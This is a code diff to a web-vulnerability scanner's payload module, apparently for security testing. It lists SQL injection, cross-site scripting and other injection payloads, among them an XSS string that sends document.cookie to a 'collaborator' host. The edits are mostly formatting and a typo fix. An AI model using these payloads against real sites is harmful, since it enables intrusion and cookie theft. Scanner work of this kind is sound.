@@ -2,15 +2,22 @@
 
 from __future__ import annotations
 
-import re
-from typing import Any
-
 
 class PayloadContext:
     SQLI_ERROR_PAYLOADS = [
-        "'", '"', "`", "' OR '1'='1", "\" OR \"1\"=\"1", "' OR 1=1--", "1' OR '1'='1",
-        "' UNION SELECT NULL--", "' AND 1=2--", "' WAITFOR DELAY '0:0:5'--",
-        "'; SELECT pg_sleep(5)--", "') OR ('1'='1", "1 AND 1=1",
+        "'",
+        '"',
+        "`",
+        "' OR '1'='1",
+        '" OR "1"="1',
+        "' OR 1=1--",
+        "1' OR '1'='1",
+        "' UNION SELECT NULL--",
+        "' AND 1=2--",
+        "' WAITFOR DELAY '0:0:5'--",
+        "'; SELECT pg_sleep(5)--",
+        "') OR ('1'='1",
+        "1 AND 1=1",
     ]
 
     SQLI_BLIND_PAYLOADS = [
@@ -28,7 +35,7 @@ class PayloadContext:
         "<img src=x onerror=alert(1)>",
         "<svg onload=alert(1)>",
         "javascript:alert(1)",
-        "\"><script>alert(1)</script>",
+        '"><script>alert(1)</script>',
         "'><script>alert(1)</script>",
         "`><script>alert(1)</script>",
         "<body onload=alert(1)>",
@@ -36,7 +43,7 @@ class PayloadContext:
         "<details open ontoggle=alert(1)>",
         "<script>fetch('http://collaborator/TOKEN?c='+document.cookie)</script>",
         "'-alert(1)-'",
-        "\"-alert(1)-\"",
+        '"-alert(1)-"',
     ]
 
     SSTI_PAYLOADS = [
@@ -108,7 +115,6 @@ class PayloadContext:
             "ssti": cls.SSTI_PAYLOADS,
             "lfi": cls.LFI_PAYLOADS,
             "ssrf": cls.SSRF_PAYLOADS,
-            "sqli_blind": cls.SQLI_BLIND_PAYLOADS,
             "command_injection": cls.COMMAND_INJECTION_PAYLOADS,
         }
         return mapping.get(vuln_type, [])
@@ -127,7 +133,7 @@ class PayloadContext:
             payloads.extend(cls.SQLI_ERROR_PAYLOADS)
 
         if any(kw in name_lower for kw in ["url", "redirect", "link", "src", "href", "proxy", "path"]):
-            payloads.extend(cls.SSRI_PAYLOADS)
+            payloads.extend(cls.SSRF_PAYLOADS)
             payloads.extend(cls.LFI_PAYLOADS)
 
         if any(kw in name_lower for kw in ["cmd", "exec", "command", "run", "shell"]):
